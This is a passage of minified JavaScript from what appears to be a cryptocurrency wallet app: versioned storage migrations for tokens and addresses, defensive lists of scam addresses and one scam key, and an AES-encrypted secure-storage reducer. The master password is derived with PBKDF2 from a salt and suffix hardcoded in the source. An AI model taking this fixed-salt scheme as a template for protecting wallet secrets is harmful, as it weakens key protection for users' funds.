            }
        };
        function v20_trx_default_tokens_precision_toLower(e) {
            return String(e).toLowerCase()
        }
        const v20_trx_default_tokens_precision = async function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 20)
                return e;
            Object.assign(e, {
                version: 20
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    "trx" === e.currency && ((null == e ? void 0 : e.subWallets) || []).forEach((e => {
                        if (void 0 === e.precision || "" === e.precision) {
                            const t = Te.trx[e.currency];
                            if (!t)
                                return;
                            if (v20_trx_default_tokens_precision_toLower(t.smartContract) !== v20_trx_default_tokens_precision_toLower(e.smartContract))
                                return;
                            t.precision && (e.precision = t.precision)
                        }
                    }
                    ))
                }
                ))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V20, e)
            }
            return e
        }
          , v21_rdd_migration_of_titles = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 21)
                return e;
            Object.assign(e, {
                version: 21
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    if (null != e && e.title && -1 !== e.title.search(/reddcoin/i) && "rdd" === e.currency) {
                        const t = e.title.replace(/reddcoin/gi, "Redd");
                        e.title = t
                    }
                }
                ))
            } catch (e) {}
            return e
        }
          , v22_zcoin_migration_titles_tickers = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 22)
                return e;
            Object.assign(e, {
                version: 22
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    if (null != e && e.title && -1 !== e.title.search(/zcoin/i) && "xzc" === e.currency) {
                        const t = undefined
                          , a = e.title.replace(/zcoin/gi, "Firo").replace(/xzc/gi, "FIRO")
                          , n = "firo";
                        e.title = a;
                        e.currency = n
                    }
                }
                ))
            } catch (e) {}
            return e
        }
          , v24_bchabc_migration_to_bcha = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 24)
                return e;
            Object.assign(e, {
                version: 24
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    if (null != e && e.currency && "bchabc" === e.currency) {
                        const t = "bcha";
                        e.currency = t
                    }
                }
                ))
            } catch (e) {}
            return e
        }
          , v25_backups_auto_download = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 25)
                return e;
            Object.assign(e, {
                version: 25
            });
            (void 0 === e["autobackup-setting"] || e["autobackup-setting"] < 62) && Object.assign(e, {
                "autobackup-setting": 62
            });
            return e
        };
        var Ae = a(98148);
        const v26_bnb_tokens = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 26)
                return t;
            Object.assign(t, {
                version: 26
            });
            if (!t.wallets)
                return t;
            const a = t.wallets.filter((e => e && "bnb" === e.currency));
            if (!a.length)
                return t;
            try {
                for (const e of a) {
                    const {address: t, currency: a, family: n, derivePath: r, privateKey: l} = e;
                    if (t && a && r && l && "string" == typeof l) {
                        const s = await Se.Z.loadLightAdapterByWallet({
                            currency: a,
                            family: n
                        });
                        if (s && s.fetchTokenWallets) {
                            const a = await s.fetchTokenWallets({
                                address: t,
                                derivePath: r,
                                privateKey: l
                            });
                            e.subWallets = (0,
                            Ae.k)(a)
                        }
                    }
                }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V26, e)
            }
            return t
        }
          , v28_fix_bnb_tokens = async function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 28)
                return e;
            Object.assign(e, {
                version: 28
            });
            if (!e.wallets)
                return e;
            const t = e.wallets.filter((e => e && "bnb" === e.currency));
            if (!t.length)
                return e;
            try {
                for (const e of t)
                    e.subWallets = e.subWallets.filter((e => !["ankr", "inj", "kava", "now"].includes(e.currency)))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V28, e)
            }
            return e
        }
          , v29_fix_eth_subwallets = async function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 29)
                return e;
            Object.assign(e, {
                version: 29
            });
            if (!e.wallets)
                return e;
            const t = e.wallets.filter((e => e && "eth" === e.currency));
            if (!t.length)
                return e;
            try {
                for (const e of t)
                    e.subWallets = e.subWallets.filter((e => !!e.smartContract && !!e.precision))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V29, e)
            }
            return e
        }
          , v30_neo_tokens = async function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 30)
                return e;
            Object.assign(e, {
                version: 30
            });
            if (!e.wallets)
                return e;
            const t = e.wallets.filter((e => e && "neo" === e.currency));
            return t.length,
            e
        };
        var xe = a(57640)
          , Ie = a(9924);
        const v31_fix_neo_tokens = async function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 31)
                return e;
            Object.assign(e, {
                version: 31
            });
            if (!e.wallets)
                return e;
            const t = e.wallets.filter((e => e && "neo" === e.currency));
            if (!t.length)
                return e;
            try {
                for (const e of t)
                    e.subWallets.length && (e.subWallets = e.subWallets.map((e => {
                        "gas" !== e.currency || "neo" !== e.family || e.smartContract || (e.smartContract = "602c79718b16e442de58778e148d0b1084e3b2dffd5de6b7b16cee7969282de7");
                        return e
                    }
                    )))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V30, e)
            }
            return e
        }
          , v32_fix_eth_pax_token = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 32)
                return t;
            Object.assign(t, {
                version: 32
            });
            if (!t.wallets)
                return t;
            const a = t.wallets.filter((e => e && "eth" === e.currency));
            if (!a.length)
                return t;
            try {
                for (const e of a)
                    e.subWallets && (e.subWallets = e.subWallets.map((e => "pax" === (null == e ? void 0 : e.currency) ? Object.assign(e, {
                        title: "Pax Dollar",
                        currency: "USDP"
                    }) : e)))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V32, e)
            }
            return t
        }
          , v33_trx_fix_usdt = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 33)
                return e;
            Object.assign(e, {
                version: 33
            });
            try {
                if (!e.wallets)
                    return e;
                const t = e.wallets.filter((e => e && "trx" === e.currency));
                t.forEach((e => {
                    e.subWallets.length && (e.subWallets = e.subWallets.map((e => {
                        "tr7nhqjekqxgtci8q8zy4pl8otszgjlj6t" === e.smartContract && (e.smartContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
                        return e
                    }
                    )))
                }
                ))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V33, e)
            }
            return e
        }
          , v34_ont_decimals = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 34)
                return e;
            Object.assign(e, {
                version: 34
            });
            try {
                if (!e.wallets)
                    return e;
                const t = e.wallets.filter((e => e && "ont" === e.currency));
                t.forEach((e => {
                    e.subWallets.forEach((e => {
                        "ong" === e.currency && (e.precision = 18)
                    }
                    ))
                }
                ))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V34, e)
            }
            return e
        }
          , v35_bch_bcha_legacy_address = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 35)
                return t;
            t.version = 35;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets)
                    if (e && e.address && ("bch" === e.currency || "bcha" === e.currency)) {
                        const t = undefined
                          , a = (await Se.Z.getApiByWallet(e)).toConvertAddress({
                            address: e.address,
                            type: "legacy"
                        });
                        a && (e.legacyAddress = a)
                    }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V35, e)
            }
            return t
        }
          , v36_cro_fix_smart_contranct = function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 36)
                return t;
            t.version = 36;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets) {
                    var a;
                    if (null != e && null !== (a = e.subWallets) && void 0 !== a && a.length)
                        for (const t of e.subWallets)
                            t && "0xddf993bebbd397f2a42de7c39f09f9c8e34ef322" === t.smartContract && (t.smartContract = "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b")
                }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V36, e)
            }
            return t
        }
          , v37_usdt_btc_fix_smart_contranct = function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 37)
                return t;
            t.version = 37;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets) {
                    var a;
                    if (null != e && null !== (a = e.subWallets) && void 0 !== a && a.length)
                        for (const t of e.subWallets)
                            t && "31" === t.propertyid && (t.smartContract = "31")
                }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V37, e)
            }
            return t
        }
          , v38_nano_rebranding_xno = function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 38)
                return t;
            t.version = 38;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets)
                    "nano" !== (null == e ? void 0 : e.currency) || null != e && e.family || (e.currency = "xno")
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V38, e)
            }
            return t
        }
          , v39_bcha_rebranding_xec = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 39)
                return t;
            t.version = 39;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets)
                    if ("bcha" === (null == e ? void 0 : e.currency) && (null == e || !e.family)) {
                        e.currency = "xec";
                        if (e && e.address && e.legacyAddress) {
                            const t = await Se.Z.getApiByCurrency(e.currency);
                            e.address = t.toConvertAddress({
                                address: e.address,
                                type: "ecash"
                            })
                        }
                    }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V39, e)
            }
            return t
        }
          , v40_ada_token = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 40)
                return t;
            t.version = 40;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets)
                    "ada-shelley" === (null == e ? void 0 : e.currency) && (e.subWalletsHidden = !1)
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V40, e)
            }
            return t
        }
          , Pe = ["0xe8279fe8ddf49daade73146311ee1273f041dc9e"]
          , v41_usdt_scam_token = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 41)
                return t;
            t.version = 41;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets) {
                    var a;
                    "eth" === (null == e ? void 0 : e.currency) && null != e && null !== (a = e.subWallets) && void 0 !== a && a.length && (e.subWallets = e.subWallets.filter((e => {
                        var t;
                        return -1 === Pe.indexOf((null == e || null === (t = e.smartContract) || void 0 === t ? void 0 : t.toLowerCase()) || "")
                    }
                    )))
                }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V41, e)
            }
            return t
        }
          , Le = "0x3802c218221390025bceabbad5d8c59f40eb74b8"
          , v42_geth_precision_fix = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 42)
                return t;
            t.version = 42;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets) {
                    var a;
                    if (null != e && null !== (a = e.subWallets) && void 0 !== a && a.length)
                        for (const t of e.subWallets)
                            t && t.smartContract === Le && 18 !== t.precision && (t.precision = 18)
                }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V42, e)
            }
            return t
        }
          , Fe = "epjfwdd5aufqssqem2qn1xzybapc8g4weggkzwytdt1v"
          , We = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
          , Re = "es9vmfrzacermjfrf4h2fyd4kconky11mcce8benwnyb"
          , Be = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"
          , Oe = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
          , v43_usdt_trc20_precision_usdc_sol_contract_fix = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 43)
                return t;
            t.version = 43;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets) {
                    var a;
                    if (null != e && null !== (a = e.subWallets) && void 0 !== a && a.length)
                        for (const t of e.subWallets) {
                            t && t.smartContract === Fe && (t.smartContract = We);
                            t && t.smartContract === Re && (t.smartContract = Be);
                            t && t.smartContract === Oe && 6 !== t.precision && (t.precision = 6)
                        }
                }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V43, e)
            }
            return t
        }
          , De = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"
          , v44_tusd_trc20_precision_fix = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 44)
                return t;
            t.version = 44;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets) {
                    var a;
                    if (null != e && null !== (a = e.subWallets) && void 0 !== a && a.length)
                        for (const t of e.subWallets)
                            t && t.smartContract === De && 18 !== t.precision && (t.precision = 18)
                }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V44, e)
            }
            return t
        }
          , v45_xmr_fix_private_key_structure = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 45)
                return t;
            t.version = 45;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets)
                    "xmr" === (null == e ? void 0 : e.currency) && null != e && e.privateKey.privateKey && "object" == typeof (null == e ? void 0 : e.privateKey.privateKey) && "viewKey"in (null == e ? void 0 : e.privateKey.privateKey) && "spendKey"in (null == e ? void 0 : e.privateKey.privateKey) && "mnemonic"in (null == e ? void 0 : e.privateKey.privateKey) && (e.privateKey = null == e ? void 0 : e.privateKey.privateKey)
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V45, e)
            }
            return t
        }
          , isMnemonicPrivateKey = e => "string" == typeof e && (null == e ? void 0 : e.split(" ").length) > 5
          , v47_ada_reward_address_add = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 47)
                return t;
            t.version = 47;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets)
                    if ("ada-shelley" === (null == e ? void 0 : e.currency) && (null == e || !e.rewardAddress || null != e && e.rewardAddress.startsWith("addr"))) {
                        const t = isMnemonicPrivateKey(e.privateKey) ? e.privateKey : e.privateKey.mnemonic
                          , a = await Se.Z.getApiByCurrency("ada-shelley")
                          , {address: n, rewardAddress: r} = await a.getAddressFromMnemonic({
                            mnemonic: t
                        });
                        e.address === n && (e.rewardAddress = r)
                    }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V47, e)
            }
            return t
        }
          , Me = ["15rXcvnNQbKskcbvJ39UynZY2AddD4L5wpn4FiNRLp58TrVz", "15iHu1ifnoWi5xTBZQh53duAaZA4pNdnYUAhMWSXYu4ZS7f1", "167RR6MUshKg5vwnMKMyvYaWxy9v5Hj8NMLtHskeBhYcGjj3", "11ugEa6BARG2hj16SXFXzxZootpQnduKhjyTn4GZsc3rCuK", "14kmCCHkYbNRXhSnNmLQUKM6bLQ3R4Qw7Ty4Y23A8uaFsScr", "15tnkxiPMowAEE4TCcYHhpcJrwt2Y5LTZWb77K8ppp8eftX1", "16B3EPsdPEnU52ma6RnMqUeoHXYngcqt2ZwZEqgdTPvr1LL5", "13mgj4fTQBgcBmjfksZszEJLY7NBAnaKTN9KPjRaT9efyC2k", "15JGbyd7wqFRkajGXFW9ZXS8GEA9HYqSpJLmLmdfwvDFyxsq", "15rHw86Tj2GouVgHbM6qeVW3K6gQpkLsGpHDGA9MbVZeRhP4", "15aacw6zzy6UtB8RhxdFAXX65N6kAcVXxXpzQkmbHGmaDetR", "13mj33t3NRzPzU8G2Rb9Aszqo68JNRCf36cKTLApqmGcAvFE", "15MyGANUPeeV39ebrNPFRECr13dLr1B6d1pazGphRtREE7vP", "1xzN5kcmdT6LTpVUkds8grYdzqqNBHyRwixD1m9z8e97rXu", "14SLLkZhoofeQ6ANR2HLAYJq6GBgD8mh5iQiQH5kRwNinzzH", "14gTYbEDgweXqRDvGrQFAcBYtZtLhu2tUHEzSmYMcfrZi43p", "15oEupk2XNbbtrSJrYFJUN7prq7GQUKwCpXAH5Qd7U6kVKu2", "13VVBNV3Dw5RChBZA8kKwFgAE8SD1PzEyLopociJ9Cvpp8jL", "1HybobZVF4mvZBkCETJsdRKsYCRQdFb6hDMexTy89c66ws4", "13N4TUFoPTZbWUG73LXQ7naMR48kUG3Trv1a592YmQimmw7v", "16JmNd9dyorvcAdq3SYWyomPtG2kTQwTqH2otTANWKMgE9t7"]
          , excludeDotScamWallet = e => !("dot" === e.currency && Me.includes(e.address))
          , v49_dot_remove_scam_address = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 49)
                return t;
            t.version = 49;
            try {
                if (!t.wallets)
                    return t;
                t.wallets = t.wallets.filter(excludeDotScamWallet)
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V49, e)
            }
            return t
        }
          , Ue = ["zneepvvChA7bNk9QPTc4wk48H3gxBVSyR32", "znVwnJp1KiuxgPNhFNLUaQZdkb7DWf8mYAU", "znotUYX7qhmEK2GZ9URD23hy9g4i6BtLigr", "znWzcFecsEZWoNSHvXxkMFpqbGW61Phc6ki", "znpMw64Vm7gUj6Xdzn7GtZruu8uDkGrKC7w", "zncftzZMMdCZGeFAPM8wuZioDHN5gzhMBFR", "znbmKbG3GRZPiSr5qdQ3cmgGh7eDV1r2z6Z", "znVs4a4u2EavNsqCSqjpuR6cs57fV9rvXJJ", "znkhSq9dXUkbU1sZMVn4VJCuCCScFZDSbJi", "znizeSFdGTSzEM2utH17z7nkGp6xT8rL9TZ", "znahVbRuwLmy4ZCv9aHRMyRj8BsgcBoss87", "znjs6Wo7Ri88Gh5XmbNaMppfwjRNeJYdhXC", "znmafdsWDxeDaNJ6yQcHz8seLzoVFCyC2Yq", "znXPFaxjDQwzrPNLoiBSR2rqzfh7dEGasaX", "znYiKbu5wxKVvaYu1RtEdurweNXacYL9w7N", "znX6zuJEX5S1sFze4GpiFv9yUmW7PKXdYZ2", "znVvnyr7LrWeJVyxeRukfg9dkTUsjKv78vk", "znhhyeosc87LQC9pmnMPwxWYABHxDDcsWef", "znZJeEr7rQTJgPvqoYGud5nFJHfiVqPUtoC", "znhJq4QVABEBmi6bfoERBKM4diwb6nE1NEG"]
          , excludeZenScamWallet = e => !("zen" === e.currency && Ue.includes(e.address))
          , v50_zen_remove_scam_address = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 50)
                return t;
            t.version = 50;
            try {
                if (!t.wallets)
                    return t;
                t.wallets = t.wallets.filter(excludeZenScamWallet)
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V50, e)
            }
            return t
        }
          , Ge = ["5JbgEmLoU4h8hCQpAzBQqSSDJSmBEmqgqrLmxHQm3sdtiHRUdQv"]
          , Ve = ["EOS7DNhAcumnPhtwNFfBX4JQMdvB9awLiiaY6ix96z4bUm725vD5R"]
          , excludeEosScamWallet = e => !("eos" === e.currency && (Ge.includes(e.privateKey) || Ve.includes(e.publicKey)))
          , v51_eos_remove_scam_address = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 51)
                return t;
            t.version = 51;
            try {
                if (!t.wallets)
                    return t;
                t.wallets = t.wallets.filter(excludeEosScamWallet)
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V51, e)
            }
            return t
        }
          , Ke = "0x4200000000000000000000000000000000000042"
          , v52_op_change_precision_18 = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 52)
                return t;
            t.version = 52;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets) {
                    var a;
                    if (null != e && null !== (a = e.subWallets) && void 0 !== a && a.length)
                        for (const t of e.subWallets)
                            t && t.smartContract === Ke && 18 !== t.precision && (t.precision = 18)
                }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V52, e)
            }
            return t
        }
          , v53_remove_backup_staking = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 53)
                return t;
            t.version = 53;
            try {
                if (null == t || !t.staking)
                    return t;
                delete t.staking
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V53, e)
            }
            return t
        }
          , v54_ton_token_address = async function() {
            var e;
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ((null !== (e = t.version) && void 0 !== e ? e : -1) >= 54)
                return t;
            t.version = 54;
            try {
                if (!t.wallets)
                    return t;
                for (const e of t.wallets)
                    if ("ton" === (null == e ? void 0 : e.currency)) {
                        var a;
                        e.subWallets = null === (a = e.subWallets) || void 0 === a ? void 0 : a.map((t => {
                            if (t && "tokenAddress"in t == !1) {
                                t.tokenAddress = t.address;
                                t.address = e.address
                            }
                            return t
                        }
                        ))
                    }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V54, e)
            }
            return t
        }
          , He = "mnemonic"
          , ze = "wallets"
          , je = "TokenCreatorEngine"
          , $e = "defaultWallet"
          , Ze = "autobackup-setting"
          , Ye = "session-timeout"
          , qe = "eos-account-creator"
          , Xe = "last-update-time"
          , Qe = "crux-id"
          , Je = "ud-id"
          , et = "is-required-password"
          , tt = "uuid"
          , at = "activate-ref-link"
          , nt = "version";
        var rt = a(41817);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class FallbackStorageError extends Error {
            constructor() {
                super(...arguments);
                _defineProperty(this, "name", "FallbackStorageError")
            }
        }
        class FallbackStoragePrimaryPersistError extends FallbackStorageError {
            constructor(e, t) {
                super("Primary storage operation failed, fallback storage operation succeded: " + e.message);
                _defineProperty(this, "name", "FallbackStoragePrimaryPersistError");
                _defineProperty(this, "cause", void 0);
                _defineProperty(this, "value", void 0);
                this.cause = e;
                this.value = t
            }
        }
        class FallbackStorageFallbackPersistError extends FallbackStorageError {
            constructor(e, t) {
                super("Fallback storage operation failed, primary storage operation succeded: " + e.message);
                _defineProperty(this, "name", "FallbackStorageFallbackPersistError");
                _defineProperty(this, "cause", void 0);
                _defineProperty(this, "value", void 0);
                this.cause = e;
                this.value = t
            }
        }
        class FallbackStorageFatalPersistError extends FallbackStorageError {
            constructor(e, t) {
                super("Both primary and fallback storage operations failed: " + e.message + " " + t.message);
                _defineProperty(this, "name", "FallbackStorageFatalPersistError");
                _defineProperty(this, "primaryCause", void 0);
                _defineProperty(this, "fallbackCause", void 0);
                this.primaryCause = e;
                this.fallbackCause = t
            }
        }
        const st = "XB7sHH26Hn&FmPLxnjGccKTfPV(yk"
          , patchMasterPassword = e => `${(0,
        Q.PBKDF2)(e, st)}(tXntTbJFzh]4EuQVmjzM9GXHCth8`
          , it = (0,
        te.createAction)("@wallet-updater/UPDATE_WALLET")()
          , ot = (0,
        te.createAction)("@wallet-updater/setIsAllBalanceUpdating")()
          , ct = (0,
        te.createAction)("@wallet-updater/setIsBackupInitialized")()
          , ut = (0,
        te.createAction)("@wallets/updater/init-updater")()
          , dt = (0,
        te.createAction)("@wallets/updater/updateAllWallets")()
          , mt = ee.P.create({
            name: "reducer-secure-storage"
        })
          , pt = {
            masterPassword: "",
            reason: "",
            data: "",
            isRestoreInProgress: !1,
            mnemonic: ""
        }
          , ft = new J.Z
          , Et = ["data"]
          , ht = [v1_private_keys, v2_balance, v3_tokens, v4_eos, v5_balances, v6_trim, v7_wallet_models, v8_btc_wallets, v9_title, v10_backup_uuid, v11_yec_failed, v12_waves_eos_tokens, v13_trx_tokens, v14_fix_title, v15_bch_bsv_addresses, v17_btc_multisigs, v18_ledger_eth_derivepath, v19_eos_filter_txs, v20_trx_default_tokens_precision, v21_rdd_migration_of_titles, v22_zcoin_migration_titles_tickers, v24_bchabc_migration_to_bcha, v25_backups_auto_download, v26_bnb_tokens, v28_fix_bnb_tokens, v29_fix_eth_subwallets, v30_neo_tokens, v31_fix_neo_tokens, v32_fix_eth_pax_token, v33_trx_fix_usdt, v34_ont_decimals, v35_bch_bcha_legacy_address, v36_cro_fix_smart_contranct, v37_usdt_btc_fix_smart_contranct, v38_nano_rebranding_xno, v39_bcha_rebranding_xec, v40_ada_token, v41_usdt_scam_token, v42_geth_precision_fix, v43_usdt_trc20_precision_usdc_sol_contract_fix, v44_tusd_trc20_precision_fix, v45_xmr_fix_private_key_structure, v47_ada_reward_address_add, v49_dot_remove_scam_address, v50_zen_remove_scam_address, v51_eos_remove_scam_address, v52_op_change_precision_18, v53_remove_backup_staking, v54_ton_token_address]
          , patchMigrations = async (e, t, a) => {
            let n = e;
            for (const e of ht) {
                const r = n.version;
                n = await e(n);
                r !== n.version && t && a && ft.emit("migrations-complete", {
                    version: n.version,
                    dispatch: t,
                    getStore: a
                })
            }
            return n
        }
          , yt = "secure-storage"
          , vt = (0,
        te.createReducer)(pt).handleAction(ie.storageSaveAndTryFlushCommit, ( (e, t) => {
            let {payload: {data: a}} = t;
            return {
                ...e,
                data: a
            }
        }
        )).handleAction(ie.setMasterPasswordCommit, ( (e, t) => {
            let {payload: {masterPassword: a}} = t;
            return {
                ...e,
                masterPassword: a
            }
        }
        )).handleAction(ae, (e => ({
            ...e,
            masterPassword: ""
        }))).handleAction(le, ( (e, t) => {
            let {payload: {reason: a}} = t;
            return {
                ...e,
                reason: a
            }
        }
        )).handleAction(re, (e => ({
            ...e,
            reason: ""
        }))).handleAction(se, ( (e, t) => {
            let {payload: {isRestoreInProgress: a}} = t;
            return {
                ...e,
                isRestoreInProgress: a
            }
        }
        )).handleAction(ne, (e => ({
            ...e,
            masterPassword: "",
            data: ""
        })))
          , checkMasterPassword = e => (t, a) => {
            const n = patchMasterPassword(e)
              , r = (0,
            oe.gX)(a());
            try {
                const e = Q.AES.decrypt(r, n).toString(Q.enc.Utf8);
                JSON.parse(e);
                return !0
            } catch (e) {
                mt.error("checkMasterPassword reducer failed", e);
                return !1
            }
        }
          , storageFlush = () => async (e, t, a) => {
            let {persistor: n} = a
              , r = !1;
            try {
                await n.flush()
            } catch (e) {
                console.error(e);
                const t = undefined;
                r = !(e && (e instanceof FallbackStoragePrimaryPersistError || e instanceof FallbackStorageFallbackPersistError))
            }
            return {
                persistorFlushFailedFatally: r
            }
        }
          , changeMasterPassword = (e, t) => async (a, n) => {
            const r = patchMasterPassword(e)
              , l = patchMasterPassword(t)
              , s = (0,
            oe.gX)(n())
              , i = Q.AES.decrypt(s, r).toString(Q.enc.Utf8)
              , o = Q.AES.encrypt(i, l).toString();
            await a(ie.storageSaveAndTryFlushCommit({
                data: o
            }));
            const c = await a(storageFlush());
            a(ie.setMasterPasswordCommit({
                masterPassword: l
            }));
            return c
        }
          , decodeStorageByPassword = (e, t) => async (a, n) => {
            const r = n()
              , l = t || (0,
            oe.gX)(r)
              , s = e ? patchMasterPassword(e) : (0,
            oe.P2)(r);
            try {
                const e = Q.AES.decrypt(l, s).toString(Q.enc.Utf8);
                let t = JSON.parse(e);
                "string" == typeof t && (t = JSON.parse(t));
                const r = undefined;
                return await patchMigrations(t, a, n)
            } catch (e) {
                mt.error("decodeStorageByPassword reducer failed", e);
                return !1
            }
        }
          , restoreStorage = (e, t) => async a => {
